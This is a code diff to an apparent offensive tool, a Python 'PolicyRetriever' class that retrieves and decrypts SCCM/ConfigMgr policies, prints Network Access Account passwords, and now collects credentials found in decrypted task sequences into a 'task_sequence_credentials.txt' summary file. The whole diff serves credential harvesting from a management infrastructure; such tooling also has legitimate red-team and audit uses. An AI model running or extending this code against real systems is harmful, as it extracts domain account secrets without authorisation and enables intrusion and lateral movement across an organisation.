@@ -400,6 +400,7 @@ class PolicyRetriever:
                 print(f"[*] Saved raw NAA response to {os.path.join(output_dir, 'NAAConfig.raw')}")
 
         # Process Task Sequences
+        credential_hits = []
         print("\n[*] Processing Task Sequence Configuration...")
         for i, resp in enumerate(results["ts"]):
             try:
@@ -417,7 +418,9 @@ class PolicyRetriever:
                     f.write(ts_xml)
                 print(f"[*] Saved Task Sequence to {ts_path}")
 
-                self._process_task_sequence_xml(ts_xml, output_dir)
+                ts_filename, hits = self._process_task_sequence_xml(ts_xml, output_dir)
+                if hits:
+                    credential_hits.append((f"TaskSequence_{i}", ts_filename, hits))
             except Exception as e:
                 print(f"[!] Failed to process Task Sequence: {e}")
                 with open(os.path.join(output_dir, f"TaskSequence_{i}.raw"), "wb") as f:
@@ -457,6 +460,16 @@ class PolicyRetriever:
             except Exception as e:
                 print(f"[!] Failed to process Collection Settings: {e}")
 
+        if credential_hits:
+            summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
+            with open(summary_path, "w") as f:
+                for ts_source, ts_output, hits in credential_hits:
+                    f.write(f"== {ts_source} -> {ts_output}\n")
+                    for name, prop, value in hits:
+                        f.write(f"{name} ({prop}) = {value}\n")
+                    f.write("\n")
+            print(f"[*] Wrote task sequence credential summary to {summary_path}")
+
     def _process_naa_xml(self, naa_xml):
         """Extract NAA credentials from policy XML."""
         root = ET.fromstring(naa_xml)
@@ -479,7 +492,9 @@ class PolicyRetriever:
                     print(f"[!] Network Access Account Password: '{password}'")
 
     def _process_task_sequence_xml(self, ts_xml, output_dir):
-        """Extract credentials from task sequence policies."""
+        """Extract credentials from task sequence policies.
+        Returns (output_filename, hits) tuple.
+        """
         root = ET.fromstring(ts_xml)
 
         pkg_name_el = root.find(".//*[@name='PKG_Name']/value")
@@ -503,19 +518,20 @@ class PolicyRetriever:
                     print(f"[*] Successfully decrypted TS_Sequence")
                 except Exception:
                     print(f"[!] Failed to decrypt TS_Sequence")
-                    return []
+                    return None, []
 
             ts_name = f"{pkg_name}-{adv_id}"
             safe_name = "".join(c for c in ts_name if c.isalnum() or c in " ._-").rstrip()
-            ts_path = os.path.join(output_dir, f"{safe_name}.xml")
+            ts_filename = f"{safe_name}.xml"
+            ts_path = os.path.join(output_dir, ts_filename)
             with open(ts_path, "w") as f:
                 f.write(ts_sequence)
             print(f"[*] Wrote TS_Sequence to {ts_path}")
 
             # Search for credential fields
-            return self._find_creds_in_ts(ts_sequence)
+            return ts_filename, self._find_creds_in_ts(ts_sequence)
 
-        return []
+        return None, []
 
     def _find_creds_in_ts(self, ts_xml):
         """Search task sequence XML for credential fields."""
@@ -600,9 +616,9 @@ class PolicyRetriever:
                     f.write(ts_xml)
                 print(f"[*] Wrote {ts_out}")
 
-                hits = self._process_task_sequence_xml(ts_xml, output_dir)
+                ts_filename, hits = self._process_task_sequence_xml(ts_xml, output_dir)
                 if hits:
-                    credential_hits.append((ts_name, hits))
+                    credential_hits.append((ts_name, ts_filename, hits))
             except Exception as e:
                 print(f"[!] Failed to process local {ts_name}: {e}")
 
@@ -639,8 +655,8 @@ class PolicyRetriever:
         if credential_hits:
             summary_path = os.path.join(output_dir, "task_sequence_credentials.txt")
             with open(summary_path, "w") as f:
-                for ts_name, hits in credential_hits:
-                    f.write(f"== {ts_name}\n")
+                for ts_source, ts_output, hits in credential_hits:
+                    f.write(f"== {ts_source} -> {ts_output}\n")
                     for name, prop, value in hits:
                         f.write(f"{name} ({prop}) = {value}\n")
                     f.write("\n")
